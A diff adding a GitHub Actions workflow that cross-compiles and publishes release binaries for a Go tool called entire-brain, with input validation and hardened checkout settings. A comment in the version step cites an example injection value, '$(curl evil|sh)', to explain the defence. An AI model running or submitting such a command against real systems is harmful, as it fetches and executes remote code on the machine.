@@ -1,0 +1,156 @@
+name: release
+
+on:
+  workflow_dispatch:
+    inputs:
+      version:
+        description: "Version to release (e.g. v0.1.0). Defaults to the pushed tag."
+        required: false
+        type: string
+  pull_request:
+    paths:
+      - .github/workflows/release.yml
+  push:
+    tags:
+      - "v*"
+
+permissions:
+  contents: read
+
+# A tag push and a nightly dispatch can target the same version. Serialize them
+# so the second completes the existing release in place instead of racing it.
+concurrency:
+  # Key on the version being released, not on ref_name: for a tag push
+  # ref_name is the tag, but for a dispatch it is the branch, so the two runs
+  # this is meant to serialize would land in different groups and race to
+  # create the same release.
+  group: release-${{ inputs.version || github.ref_name }}
+  cancel-in-progress: false
+
+jobs:
+  build:
+    name: build
+    runs-on: ubuntu-24.04
+    steps:
+      - uses: actions/checkout@v6
+        with:
+          persist-credentials: false
+
+      - uses: actions/setup-go@v6
+        with:
+          go-version: "1.27.x"
+
+      # Brain is pure Go on the default build tags: the SQLite driver and the
+      # embedder both have purego implementations, and the cgo stack sits behind
+      # `brain_cgo`. So every target cross-compiles from one runner, and the
+      # released binaries need no C toolchain on the user's machine either.
+      - name: Verify the default build needs no cgo
+        run: |
+          set -euo pipefail
+          CGO_ENABLED=0 go build -o /dev/null ./cmd/entire-brain
+          echo "default build is pure Go"
+
+      - name: Resolve version
+        id: v
+        env:
+          # Never interpolate a workflow input straight into a run: block. The
+          # expression is substituted as text before the shell parses it, so a
+          # dispatch value like $(curl evil|sh) would execute on the runner.
+          VERSION_INPUT: ${{ inputs.version }}
+        run: |
+          set -euo pipefail
+          if [[ "${GITHUB_REF_TYPE}" == "tag" ]]; then
+            version="${GITHUB_REF_NAME}"
+          elif [[ -n "${VERSION_INPUT}" ]]; then
+            version="${VERSION_INPUT}"
+          else
+            version="v0.0.0-dev.$(git rev-parse --short HEAD)"
+          fi
+          # A version reaches tag names, file names and release titles. Pin its
+          # shape rather than trusting whatever was dispatched.
+          if [[ ! "$version" =~ ^v[0-9]+\.[0-9]+\.[0-9]+([-+][0-9A-Za-z.-]+)?$ ]]; then
+            echo "::error::refusing to build an unrecognised version: ${version}"
+            exit 1
+          fi
+          echo "version=${version}" >> "$GITHUB_OUTPUT"
+          echo "bare=${version#v}" >> "$GITHUB_OUTPUT"
+          echo "building ${version}"
+
+      - name: Build every target
+        env:
+          VERSION: ${{ steps.v.outputs.version }}
+          BARE: ${{ steps.v.outputs.bare }}
+        run: |
+          set -euo pipefail
+          mkdir -p dist
+          targets="linux/amd64 linux/arm64 darwin/amd64 darwin/arm64 windows/amd64 windows/arm64"
+          for t in $targets; do
+            goos="${t%/*}"; goarch="${t#*/}"
+            out="entire-brain"
+            [[ "$goos" == windows ]] && out="entire-brain.exe"
+            echo "==> $goos/$goarch"
+            CGO_ENABLED=0 GOOS="$goos" GOARCH="$goarch" \
+              go build -trimpath -ldflags "-s -w -X main.version=${BARE}" \
+              -o "dist/$out" ./cmd/entire-brain
+            asset="entire-brain_${BARE}_${goos}_${goarch}"
+            if [[ "$goos" == windows ]]; then
+              (cd dist && zip -q "${asset}.zip" "$out" && rm "$out")
+            else
+              (cd dist && tar -czf "${asset}.tar.gz" "$out" && rm "$out")
+            fi
+          done
+          (cd dist && sha256sum * > checksums.txt)
+          ls -la dist
+
+      - uses: actions/upload-artifact@v4
+        with:
+          name: release-dist
+          path: dist/
+          retention-days: 7
+
+  publish:
+    name: publish
+    needs: build
+    # Only a real tag publishes. A pull_request run proves the build still works
+    # without creating a release.
+    if: github.event_name != 'pull_request'
+    runs-on: ubuntu-24.04
+    permissions:
+      contents: write
+    steps:
+      - uses: actions/checkout@v6
+        with:
+          persist-credentials: false
+
+      - uses: actions/download-artifact@v4
+        with:
+          name: release-dist
+          path: dist
+
+      - name: Create or update the release
+        env:
+          GH_TOKEN: ${{ github.token }}
+          VERSION_INPUT: ${{ inputs.version }}
+        run: |
+          set -euo pipefail
+          if [[ "${GITHUB_REF_TYPE}" == "tag" ]]; then
+            version="${GITHUB_REF_NAME}"
+          else
+            version="${VERSION_INPUT}"
+          fi
+          [[ -n "$version" ]] || { echo "no version to publish" >&2; exit 1; }
+          if [[ ! "$version" =~ ^v[0-9]+\.[0-9]+\.[0-9]+([-+][0-9A-Za-z.-]+)?$ ]]; then
+            echo "::error::refusing to publish an unrecognised version: ${version}"
+            exit 1
+          fi
+
+          mapfile -t assets < <(find dist -type f | sort)
+          if gh release view "$version" --repo "$GITHUB_REPOSITORY" >/dev/null 2>&1; then
+            echo "release $version exists — updating assets in place"
+            gh release upload "$version" "${assets[@]}" --clobber --repo "$GITHUB_REPOSITORY"
+          else
+            gh release create "$version" "${assets[@]}" \
+              --repo "$GITHUB_REPOSITORY" \
+              --title "$version" \
+              --generate-notes
+          fi
